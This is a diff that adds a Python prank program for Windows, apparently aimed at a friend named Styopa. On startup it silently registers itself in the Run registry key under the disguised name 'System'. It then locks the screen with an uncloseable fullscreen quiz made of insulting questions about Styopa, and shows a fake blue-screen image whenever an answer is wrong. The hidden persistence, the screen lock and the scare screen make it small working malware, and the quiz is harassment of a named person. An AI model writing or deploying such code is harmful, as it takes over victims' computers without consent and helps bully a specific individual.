@@ -1,0 +1,91 @@
+import tkinter as tk
+from tkinter import messagebox
+from PIL import Image, ImageTk # Нужно установить: pip install Pillow
+import os
+import sys
+import winreg as reg
+
+def add_to_startup():
+    path = os.path.realpath(sys.argv[0])
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    try:
+        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(key, "System", 0, reg.REG_SZ, path)
+        reg.CloseKey(key)
+    except: pass
+
+add_to_startup()
+
+questions = [
+    ("6x7 = ?", "67"),
+    ("Сколько хромосом у Степы?", "67"),
+    ("67 или 52", "67"),
+    ("Сколько у Степы IQ", "0"),
+    ("какой буквы/букв нехватает? (степа туп)", "ой")
+]
+
+class PrankQuiz:
+    def __init__(self, root):
+        self.root = root
+        self.root.attributes("-fullscreen", True)
+        self.root.attributes("-topmost", True) 
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
+        
+        self.current_q = 0
+        
+        self.label = tk.Label(root, text="", font=("Arial", 28), fg="white", bg="#2c3e50")
+        self.root.configure(bg="#2c3e50")
+        self.label.pack(pady=100)
+        
+        self.entry = tk.Entry(root, font=("Arial", 20), justify='center')
+        self.entry.pack(pady=20)
+        self.entry.bind('<Return>', lambda e: self.check_answer())
+        
+        tk.Button(root, text="Проверить", command=self.check_answer, font=("Arial", 14)).pack(pady=20)
+        
+        self.show_question()
+
+    def show_question(self):
+        if self.current_q < len(questions):
+            self.label.config(text=questions[self.current_q][0])
+            self.entry.delete(0, tk.END)
+        else:
+            messagebox.showinfo("Win", "Поздравляю ты тупой!")
+            self.root.destroy()
+
+    def check_answer(self):
+        user_ans = self.entry.get().strip().lower()
+        correct_ans = questions[self.current_q][1].lower()
+        
+        if user_ans == correct_ans:
+            self.current_q += 1
+            self.show_question()
+        else:
+            self.show_real_bsod()
+
+    def show_real_bsod(self):
+ 
+        bsod_win = tk.Toplevel(self.root)
+        bsod_win.attributes("-fullscreen", True)
+        bsod_win.attributes("-topmost", True)
+        
+
+        try:
+            img = Image.open("ecr.png") 
+
+            screen_w = self.root.winfo_screenwidth()
+            screen_h = self.root.winfo_screenheight()
+            img = img.resize((screen_w, screen_h), Image.LANCZOS)
+            
+            self.photo = ImageTk.PhotoImage(img)
+            lbl = tk.Label(bsod_win, image=self.photo, borderwidth=0)
+            lbl.pack()
+        except:
+            tk.Label(bsod_win, text="IMAGE NOT FOUND", bg="blue", fg="white").pack(expand=True)
+
+        self.root.after(10000, bsod_win.destroy)
+
+root = tk.Tk()
+app = PrankQuiz(root)
+root.mainloop()
+
